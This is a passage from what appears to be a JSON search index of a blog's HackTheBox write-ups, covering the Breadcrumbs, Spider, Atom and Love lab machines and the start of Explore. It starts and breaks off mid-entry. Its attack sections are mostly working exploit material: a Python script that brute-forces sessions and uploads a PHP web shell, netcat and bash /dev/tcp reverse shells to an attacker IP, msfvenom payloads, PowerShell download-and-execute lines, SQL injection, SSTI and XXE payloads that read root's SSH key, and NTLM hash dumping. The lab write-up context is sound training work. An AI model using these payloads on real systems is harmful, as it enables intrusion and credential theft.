&#39;HS256&#39;);echo $jwt . &quot;\\n&quot;;// $decoded = JWT::decode($jwt, $secret_key, array(&#39;HS256&#39;));// var_dump($decoded);// echo $decoded;?&amp;gt;Loop Through all possible session IDs and when u get a positive hit, save that session IDs and jwt token in cookie storage and refresh the page.Than upload the file, intercept the request and change the file extension and forward that request. Go to /portal/uploads/ and execute that php file.Here’s my exploit scriptimport argparseimport stringimport sysimport jwtimport requests as rimport randomimport hashlibparser = argparse.ArgumentParser()url = &#39;http://10.10.10.228/portal&#39;admin_name = &#39;paul&#39;secret = &#39;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#39;payload = {&quot;data&quot;: {&quot;username&quot;: admin_name}}encoded_jwt = jwt.encode(payload, secret, algorithm=&quot;HS256&quot;)# decoded_jwt = jwt.decode(encoded_jwt, secret, algorithms=[&quot;HS256&quot;])rnd_word = &#39;&#39;.join(random.choices(string.ascii_letters + string.digits, k=8))def makesession(username): maximum = len(username) - 1 seed = random.randint(0, maximum) key = &quot;s4lTy_stR1nG_&quot; + username[seed] + &quot;(!528./9890&quot; session_cookie = username + hashlib.md5(key.encode()).hexdigest() return session_cookiedef admin(admin_session): cookies_dict = {&quot;PHPSESSID&quot;: admin_session, &quot;token&quot;: encoded_jwt} admin_rsnp = r.get(f&#39;{url}/index.php&#39;, cookies=cookies_dict) return admin_rsnp.textdef upload_file(): loop = True print(&quot;[+] Brute frocing session ID&quot;) while loop: gen_session = makesession(admin_name) # print(gen_session) check_paul = admin(gen_session) if &quot;&amp;lt;h3&amp;gt;Dashboard&amp;lt;/h3&amp;gt;&quot; in check_paul: cookies_dict = {&quot;PHPSESSID&quot;: gen_session, &quot;token&quot;: encoded_jwt} data = &quot;-----------------------------21178199893857990766125057944\\r\\nContent-Disposition: form-data; &quot; \\ f&quot;name=\\&quot;file\\&quot;; filename=\\&quot;shell.php\\&quot;\\r\\nContent-Type: application/x-php\\r\\n\\r\\n&amp;lt;?php echo &quot; \\ f&quot;shell_exec($_POST[\\&quot;cmd\\&quot;]);?&amp;gt;\\r\\n-----------------------------21178199893857990766125057944\\r&quot; \\ f&quot;\\nContent-Disposition: form-data; &quot; \\ f&quot;name=\\&quot;task\\&quot;\\r\\n\\r\\n{rnd_word}.php\\r\\n&quot; \\ f&quot;-----------------------------21178199893857990766125057944--\\r\\n &quot; headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------21178199893857990766125057944&quot;, &quot;Content-Length&quot;: str(len(data)), &quot;Origin&quot;: &quot;http://10.10.10.228&quot;, &quot;DNT&quot;: &quot;1&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: f&quot;{url}/php/files.php&quot;} upload_file = r.post(f&#39;{url}/includes/fileController.php&#39;, headers=headers, data=data, cookies=cookies_dict, allow_redirects=True) print(&quot;[+] &quot; + upload_file.text) print(f&quot;Filenme: {rnd_word}&quot;) loop = Falsedef exec_file(file_name, cmd): post_cmd = {&quot;cmd&quot;: cmd} execute = r.post(f&#39;{url}/uploads/{file_name}.php&#39;, data=post_cmd) print(execute.text)parser.add_argument(&#39;-u&#39;, action=&#39;store_true&#39;, help=&quot;upload file&quot;)parser.add_argument(&#39;-e&#39;, action=&#39;store_true&#39;, help=&quot;execute uploaded file&quot;)parser.add_argument(&quot;-f&quot;, help=&quot;uploaded file name without Extension&quot;)parser.add_argument(&quot;-c&quot;, help=&quot;windows cmd Command&quot;)args = parser.parse_args()if **name** == &quot;**main**&quot;: try: if args.u: upload_file() elif args.e: if args.f and args.c: exec_file(args.f, args.c) else: print(&quot;[-] Missing argument&quot;) else: print(f&quot;[-] Try python {sys.argv[0]} -h&quot;) except KeyboardInterrupt: print(&#39;User has exited the program&#39;)Getting Reverse shell by uploading netcat on the nbox.powershell IWR -uri http://10.10.15.71/nc64.exe -OutFile C:\\\\windows\\\\temp\\\\nc64.execmd /c c:\\\\windows\\\\temp\\\\nc64.exe 10.10.0.4 4141 -e powershell.exePrivesc2 user on the box.Found user “juliette” creds inside C:\\Users\\www-data\\Desktop\\xampp\\htdocs\\portal\\pizzaDeliveryUserDatassh with found creds.Stickynotes backupsinside user “” home folder there is a todo.html in “Desktop” folderthey are talking about password in sticky-notes application.Founding sticky-notes files C:\\Users\\juliette\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState.Transfer files with smbimpacket-smbserver -smb2support smb .cp &amp;lt;filename&amp;gt; \\\\10.10.15.71\\smbrunning strings over “plum.sqlite-wal” found “development” user’s (looks like a) password❯ strings plum.sqlite-wal| grep development | tail -n1\\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@gAnd password work for ssh loginNow we can access to C:\\Development and there is a linux binary.Download to local machine with smbopen in ghidra, This binary connecting to local server on port 1234 and retrieving admin user password.If we check the netstat on windows, there is a port 1234TCP 127.0.0.1:1234 0.0.0.0:0 LISTENINGForwarding port with ssh and sending same request with curl gives the admin password❯ sshpass -p &#39;fN3)sN5Ee@g&#39; ssh development@breadcrumbs.htb -N -L 1234:127.0.0.1:1234 -f❯ curl &#39;http://127.0.0.1:1234/index.php?method=select&amp;amp;username=administrator&amp;amp;table=passwords&#39;selectarray(1) { [0]=&amp;gt; array(1) { [&quot;aes_key&quot;]=&amp;gt; string(16) &quot;k19D193j.&amp;lt;19391(&quot; }}sql injectionAfter test url parameters, Found sql injection in “username” parameter.❯ curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;amp;username=administrator&#39;+OR+1=1+--+-&amp;amp;table=passwords&quot;selectarray(1) { [0]=&amp;gt; array(1) { [&quot;aes_key&quot;]=&amp;gt; string(16) &quot;k19D193j.&amp;lt;19391(&quot; }}Testing union injection.❯ curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;amp;username=administrator&#39;+union+select+1--+-&amp;amp;table=passwords&quot;selectarray(2) { [0]=&amp;gt; array(1) { [&quot;aes_key&quot;]=&amp;gt; string(16) &quot;k19D193j.&amp;lt;19391(&quot; } [1]=&amp;gt; array(1) { [&quot;aes_key&quot;]=&amp;gt; string(1) &quot;1&quot; }}Get the database name.❯ curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;amp;username=administrator&#39;+union+select+database()--+-&amp;amp;table=passwords&quot;selectarray(2) { [0]=&amp;gt; array(1) { [&quot;aes_key&quot;]=&amp;gt; string(16) &quot;k19D193j.&amp;lt;19391(&quot; } [1]=&amp;gt; array(1) { [&quot;aes_key&quot;]=&amp;gt; string(5) &quot;bread&quot; }}Already know the table name from url parameter: table=passwords❯ curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;amp;username=administrator&#39;+union+select+password+FROM+bread.passwords--+-&amp;amp;table=passwords&quot;selectarray(2) { [0]=&amp;gt; array(1) { [&quot;aes_key&quot;]=&amp;gt; string(16) &quot;k19D193j.&amp;lt;19391(&quot; } [1]=&amp;gt; array(1) { [&quot;aes_key&quot;]=&amp;gt; string(44) &quot;H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=&quot; }}get the key and encrypted password. Decrypt with cyberchefssh with administrator password p@ssw0rd!@#$9890./." }, { "title": "Hackthebox - Spider", "url": "/posts/spider/", "categories": "hackthebox, linux", "tags": "xss, ssti, sqli, xxe", "date": "2021-06-28 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.243 spider.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)| 256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)|_ 256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: Did not follow redirect to http://spider.htb/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Hostname: spider.htb There is some rate limiting on http server found from html comment. &amp;lt;!-- We have enabled rate limiting to keep pesky hax0rs from attacking our service. --&amp;gt; webpage have login/register optionsFound flask auth token in webapp.❯ curl -I &#39;http://spider.htb/&#39;HTTP/1.1 200 OKServer: nginx/1.14.0 (Ubuntu)Date: Thu, 17 Jun 2021 09:49:00 GMTContent-Type: text/html; charset=utf-8Content-Length: 11273Connection: keep-aliveVary: CookieSet-Cookie: session=eyJjYXJ0X2l0ZW1zIjpbXX0.YMsajA.QOGddQTsnFBCqN_3RTIpssfM3Mg; HttpOnly; Path=/ it contains a token based cookie.Decoding it found that it is not jwt token❯ echo eyJjYXJ0X2l0ZW1zIjpbXX0.YMsajA.QOGddQTsnFBCqN_3RTIpssfM3Mg | base64 -d{&quot;cart_items&quot;:[]}base64: invalid inputAnother popular token based auth is flask-token, there is a tool to verify/decode flask token flask-unsign❯ flask-unsign --decode --server &#39;http://spider.htb/&#39;[*] Server returned HTTP 200 (OK)[+] Successfully obtained session cookie: eyJjYXJ0X2l0ZW1zIjpbXX0.YMsb5g.iZAznu0IlWV_Kt5HcYjH2XHXUsk{&#39;cart_items&#39;: []}XSS not useful(?)Registration page has character limit for usernameAfter register, get login page with UUID in url parameterchanging value of the UUID parameter, changes the username field but &quot; do something else.because it injected in the html code, and get xss injection with &quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;FootholdExtract flask auth token secret key with ssti than exploit sql inaction in auth token to get user creds. From admin panel found blind ssti and get reverse shell.SSTIAfter login, get extra option “User information” which show user information and interesting thing is that these input fields are readonlyTrying SSTI on username field with { { 7*7 } } and get math output on “User information” pagebut because of the character limit we can not do much with it but it is a flask app(probably template engine jinja2, but it is python) so we can dump config file and get the secret key with { { config } }&amp;lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(0, 43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;RATELIMIT_ENABLED&#39;: True, &#39;RATELIMIT_DEFAULTS_PER_METHOD&#39;: False, &#39;RATELIMIT_SWALLOW_ERRORS&#39;: False, &#39;RATELIMIT_HEADERS_ENABLED&#39;: False, &#39;RATELIMIT_STORAGE_URL&#39;: &#39;memory://&#39;, &#39;RATELIMIT_STRATEGY&#39;: &#39;fixed-window&#39;, &#39;RATELIMIT_HEADER_RESET&#39;: &#39;X-RateLimit-Reset&#39;, &#39;RATELIMIT_HEADER_REMAINING&#39;: &#39;X-RateLimit-Remaining&#39;, &#39;RATELIMIT_HEADER_LIMIT&#39;: &#39;X-RateLimit-Limit&#39;, &#39;RATELIMIT_HEADER_RETRY_AFTER&#39;: &#39;Retry-After&#39;, &#39;UPLOAD_FOLDER&#39;: &#39;static/uploads&#39;}&amp;gt;SQLi in auth tokenWhile testing token parameters found sql injection in uuid parameterPayload: &#39; OR 1=1 # in UUID fieldToken generate with found secret key with flask-unsign tool❯ flask-unsign --sign --cookie &quot;{&#39;cart_items&#39;: [], &#39;uuid&#39;: &#39;\\&#39; or 1=1 #&#39;}&quot; --secret &#39;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#39;eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6Iicgb3IgMT0xICMifQ.YMuViQ.0ua4DgajELzCT9u7cIDzw9cTpGE❯ curl -s &#39;http://spider.htb/&#39; -b &#39;session=eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6Iicgb3IgMT0xICMifQ.YMuViQ.0ua4DgajELzCT9u7cIDzw9cTpGE&#39; | grep Logout | grep -o -P &#39;(?=\\().*(?&amp;lt;=\\))&#39;(logged in as chiv)uuid is a authenticated user identifier and injecting “True” statement bypass authentication.Testing for UNION based sql injectionExtracting data from database--get current database nameUNION SELECT database()--extract tables from current dbUNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#39;shop&#39;--dump all colums from tableUNION SELECT group_concat(column_name) from information_schema.columns where table_name =&#39;users&#39;--dump colum contentUNION SELECT group_concat(uuid,&#39;:&#39;,name,&#39;:&#39;,password) from shop.usersLogin with user chiv’s uuid and password get admin panelfound web directory from “View messages”Blind restricted SSTI Good blog on SSTI in jinja2Directory /a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal takes to support forum“Contact number or email” field through some interesting error that relate to SSTIUsing some bypass techniques and replacing blocked characters”{ { } }” replaced with %257B%257B %257D%257D Double url encoded.”.” replaced with [&#39; &#39;]“_” replaced with \\x5f”&#39;” replaced with &quot;Because this is a blind SSTI we can not manually found the offset of required class, to solve this i use for loop and if statement to find that but for if are also blocked.“for” replaced with withwith allows common try…except…finally usage patterns to be encapsulated for convenient reuse. EXAMPLE Using with statement because it is smiler to try but in clean manner and also try is not supported in the template language. Get the syntax for with statement from jinja2 docsand final crafted payload, i use decimal formate ip address because . is blocked.Getting reverse shellGenerate encoded reverse shell❯ echo -n &quot;/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.71/4141 0&amp;gt;&amp;amp;1&#39;&quot; | base64L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE1LjcxLzQxNDEgMD4mMSc=echo -n L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE1LjcxLzQxNDEgMD4mMSc= | base64 -d | bashPrivesc Found user “chiv” ssh key in his home folder. /var/www/webapp contains the webapp files which running on port 80 Found database creds from /var/www/webapp/app.py: chivato:rghorsfruUEFHEfhes83214 There is a another http server running on localhost on port 8080 There is a another folder name “game” which probably running on port 8080, but don’t have permission to access into it. (remote) chiv@spider:/var/www$ cd game/bash: cd: game/: Permission denied Forward port 8080 with ssh (I use cat than shift + ~ + c to get into ssh prompt because i am using zsh, if you are using bash than you can directly use shift + ~ + c)There is nothing interesting on wepapp expect the “cookie”Cookie decode with flask-unsign and get some xml data, which parsed with lxml].XXE to inject payload in auth tokencookie contains xml and after some testing, notice that changing version value in post data parameter reflated in the cookie.We don’t know the private key for this token but we can inject code.Injecting xml ENTITY from version parameter and call it from usernameusername=&amp;amp;xxe;&amp;amp;version=1.0.0--&amp;gt;&amp;lt;!DOCTYPE replace [ &amp;lt;!ENTITY xxe &quot;xxe injection&quot;&amp;gt; ]&amp;gt;&amp;lt;!--And now if we send this cookie to request /site, xxe reflected on the page.Now that xxe confirmed we can read file from system and this is running as root so we can read root file.username=&amp;amp;xxe;&amp;amp;version=1.0.0--&amp;gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;file:///root/root.txt&quot;&amp;gt; ]&amp;gt;&amp;lt;!--Getting root shell with ssh keyusername=&amp;amp;xxe;&amp;amp;version=1.0.0--&amp;gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;file:///root/.ssh/id_rsa&quot;&amp;gt; ]&amp;gt;&amp;lt;!--❯ ssh -i root_rsa root@spider.htbroot@spider:~# iduid=0(root) gid=0(root) groups=0(root)root@spider:~# " }, { "title": "Hackthebox - Atom", "url": "/posts/atom/", "categories": "hackthebox, windows", "tags": "electron updater, Kanban credentials", "date": "2021-06-28 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.237 atom.htbnmap scan:PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: Heed Solutions135/tcp open msrpc Microsoft Windows RPC443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: Heed Solutions| ssl-cert: Subject: commonName=localhost| Not valid before: 2009-11-10T23:48:47|_Not valid after: 2019-11-08T23:48:47|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http/1.1445/tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found6379/tcp open redis Redis key-value storeService Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows Windows version: OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3) Nothing in ssl certificate. Radis require authAuthentication, hacktricks ❯ redis-cli -h 10.10.10.23710.10.10.237:6379&amp;gt; infoNOAUTH Authentication required. SMB allowed access without password Found a pdf file and some empty directories. There a file available for download on http server /releases/heed_setup_v1.0.0.zip zip archive contains a windows executable. ❯ file heedv1-Setup-1.0.0.exeheedv1-Setup-1.0.0.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive pdf file contains some information about this exe file. pdf also talking about update.And if we reverse the executable with 7z in linux and find the resources folder under $PLUGINSDIR, which contains the electron app source codes in app.asar file. We can decompress app.asar file with asar tool to get the application source javascript files.❯ npx asar extract app.asar dest-dirThis application using vulnerable version of electron-updater package. Vulnerability found from snyk VulnerabilityDB electron-builder’s Electron-Updater PoC blog from blog.doyensec.comFootholdElectron Updater RCEExploit surface: The signature verification check performed by electron-builder is simply based on a string comparison between the installed binary’s publisherName and the certificate’s Common Name attribute of the update binary. During a software update, the application will request a file named latest.yml from the update server, which contains the definition of the new release - including the binary filename and hashes. our application is using smb share’s client folder for new latest.yml and we have access to these “client” folders.Other part: an attacker could bypass the entire signature verification by triggering a parse error in the script. This can be easily achieved by using a filename containing a single quote (&#39;) and then by recalculating the file hash to match the attacker-provided binary (using shasum -a 512 maliciousupdate.exe | cut -d &quot; &quot; -f1 | xxd -r -p | base64). Found update process form electron docsExploitGenerate reverse shell with msfvenom❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.71 LPORT=4141 -f exe -o &quot;rev&#39;Shell.exe&quot;generate sha512 bash encoded hash❯ sha512sum rev\\&#39;Shell.exe | cut -d &quot; &quot; -f1 | xxd -r -p | base64 -w 077b46759lH58s81l3tMaetP541XEe+XJ2V+IEPOC5dF27MjxROsm/JJMVR7tt2CN/hmVikE5d8Wa9VuxMAnFNw==configure latest.ymlversion: 1.0.1path: http://10.10.15.71/rev&#39;Shell.exesha512: 77b46759lH58s81l3tMaetP541XEe+XJ2V+IEPOC5dF27MjxROsm/JJMVR7tt2CN/hmVikE5d8Wa9VuxMAnFNw==upload latest.yml in the smb share’s “client” folder.msf shellGenerate Reverse shell with msfvenom```bashmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.71 LPORT=4141 -f psh -o msf_shell.ps1```Execute with powershell IEX```bashIEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.15.71/msf_shell.ps1&#39;)```&amp;lt;/br&amp;gt;PrivescKanban credentials encryption flaw Only one user on the box “jason”There is radis server running, get in the nmap scan, so finding radis server creds: C:\\Program Files\\Redis\\redis.windows-service.confFound “Administrator” Encrypted Password from redis database, But don’t find the encryption type.Running winpeas found user “jason” password but it is not working.Enumerating user “jason” home folder find PortableKanban in C:\\Users\\jason\\Downloads\\PortableKanban.from kanban config file found that radis is using by kanban.that looking that encrypted password from config, they both looks same.PortableKanBan stores credentials in an encrypted format and also found a script for decrypt this from ExploitDB.import base64from des import * #python3 -m pip install desdef decode(hash): hash = base64.b64decode(hash.encode(&#39;utf-8&#39;)) key = DesKey(b&quot;7ly6UznJ&quot;) return key.decrypt(hash,initial=b&quot;XuVUm5fR&quot;,padding=True).decode(&#39;utf-8&#39;)print(decode(&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&quot;))Run the script give decrypted passwordChecking if that password is working$username = &quot;domain\\Administrator&quot;$password = &quot;kidvscat_admin_@123&quot; | ConvertTo-SecureString -AsPlainText -Force$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password$s = New-PSSession -Credential $CredInvoke-Command -Session $s -Scriptblock {whoami}We can get the Administrator shell with evil-winrm❯ evil-winrm -i 10.10.10.237 -u administrator -p &#39;kidvscat_admin_@123&#39;" }, { "title": "Hackthebox - Love", "url": "/posts/love/", "categories": "hackthebox, windows", "tags": "file-upload, alwaysinstallelevated policy", "date": "2021-06-27 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.239 love.htbnmap scan:PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: Voting System using PHP135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: 403 Forbidden| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in| Not valid before: 2021-01-18T14:00:16|_Not valid after: 2022-01-18T14:00:16|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http/1.1445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)3306/tcp open mysql?| fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq: |_ Host &#39;10.10.15.71&#39; is not allowed to connect to this MariaDB server5000/tcp open http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: 403 Forbidden5040/tcp open unknown5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found| ssl-cert: Subject: commonName=LOVE| Subject Alternative Name: DNS:LOVE, DNS:Love| Not valid before: 2021-04-11T14:39:19|_Not valid after: 2024-04-10T14:39:19|_ssl-date: 2021-06-25T08:37:23+00:00; -5h04m42s from scanner time.| tls-alpn: |_ http/1.17680/tcp open pando-pub?47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC49670/tcp open msrpc Microsoft Windows RPC1 service unrecognized Information leak from https ssl certificate. Subdomain: staging.love.htb Username: roy@love.htb No other subdomain found: ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -H &#39;Host: FUZZ.love.htb&#39; -u http://love.htb/ -ac -c -v port 5000 and 443 gives “403 Forbidden” Can’t connect to SMB without password. Host: love.htb asking for username:password Subdomain staging.love.htb have signup option which don’t go anywhere, but there is a /beta.php which allows to fetch urls, and also allows SSRF.with that we can access to port 5000 and 443 which gives “403 Forbidden”, because both are on save host.port 443 https don’t response anything but port 5000 response with admin creds. successful login to http://love.htb/admin with found creds. It was just a guess. If I don’t get admin login in /admin, than I’ll run gobuster.FootholdFile upload to RCEFound file upload option in /admin/voters.php and /admin/candidates.phpTry to upload php shell from /voters.php&amp;lt;?php echo exec(&quot;whoami&quot;); ?&amp;gt;and file uploaded successfully without any restriction and upload file found in the /images directoryGetting reverse shell with PayloadsAllTheThings powershell payload and nishang revshell ps1Create shell.php, which Invoke nishang revshell ps1 script from http server.&amp;lt;?php echo exec(&quot;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.15.71/powerShellTcp.ps1&#39;)&quot;); ?&amp;gt;upload shell.php, start http server and get reverse shell.Get msf shell with msfvenom payloadmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.71 LPORT=4141 -f psh -o msf_shell.ps1ExecuteIEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.15.71/msf_shell.ps1&#39;)Privescabusing AlwaysInstallElevated policyRunning winpeas found AlwaysInstallElevated enable.AlwaysInstallElevated If these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) *.msi files as NT AUTHORITY\\SYSTEM.reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevatedreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated Exploit from hacktricks.xyz Multiple ways to exploit from hackingarticles.inExploit with metasploitexploit/windows/local/always_install_elevatedDump NTLM hashmeterpreter &amp;gt; load kiwimeterpreter &amp;gt; lsa_dump_samRID : 000001f4 (500)User : Administrator Hash NTLM: aab42ca009fed69fa5ee57c52cf5bcf1#login with evil-winrmevil-winrm -u Administrator -H aab42ca009fed69fa5ee57c52cf5bcf1 -i 10.10.10.239" }, { "title": "Hackthebox - Explore", "url": "/posts/explore/", "categories": "hackthebox, android", "tags": "es file explorer, cve-2019–6447, adb", "date": "2021-06-27 18:30:00 +0000", "snippet": " &amp;lt;/img&amp;gt;EnumerationIP-ADDR: 10.10.10.247 explore.htbnmap scan:PORT STATE SERVICE VERSION2222/tcp open ssh (protocol 2.0)| fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio| ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)34153/tcp open unknown42135/tcp open http ES File Explorer Name Response httpd|_http-server-header: ES Name Response Server|_http-title: Site doesn&#39;t have a title (text/html).59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older|_http-title: Site doesn&#39;t have a title (text/plain).FootholdES File Explorer Open Port VulnerabilityCVE-2019–6447: The ES File Explorer File Manager application through 4.1.9.7.4 for Android allows remote attackers to read arbitrary files or execute applications via TCP port 59777 requests on the local Wi-Fi network. This TCP port remains open after the ES application has been launched once, and responds to unauthenticated application/json data over HTTP. Exploit PoC: https://github.com/fs0c131y/ESFileExplorerOpenPortVuln Analysis of ES File Explorer Security Vulnerability(CVE-2019–6447)python es_poc.py --cmd getDeviceInfo --ip 10.10.10.247while exploring ES File Explorer server commands found an interesting file with listPicsthis PoC script only sending POST request with json data to the server with commands that server can execute, we can simply do this with curl. demonstrated in the PoC❯ curl --header &quot;Content-Type: application/json&quot; --request POST --data &#39;{&quot;command&quot;:&quot;listPics&quot;}&#39; http://10.10.10.247:59777[{&quot;name&quot;:&quot;concept.jpg&quot;, &quot;time&quot;:&quot;4/21/21 02:38:08 AM&quot;, &quot;location&quot;:&quot;/storage/emulated/0/DCIM/concept.jpg&quot;, &quot;size&quot;:&quot;135.33 KB (138,573 Bytes)&quot;, },{&quot;name&quot;:&quot;anc.png&quot;, &quot;time&quot;:&quot;4/21/21 02:37:50 AM&quot;, &quot;location&quot;:&quot;/storage/emulated/0/DCIM/anc.png&quot;, &quot;size&quot;:&quot;6.24 KB (6,392 Bytes)&quot;, },{&quot;name&quot;:&quot;creds.jpg&quot;, &quot;time&quot;:&quot;4/21/21 02:38:18 AM&quot;, 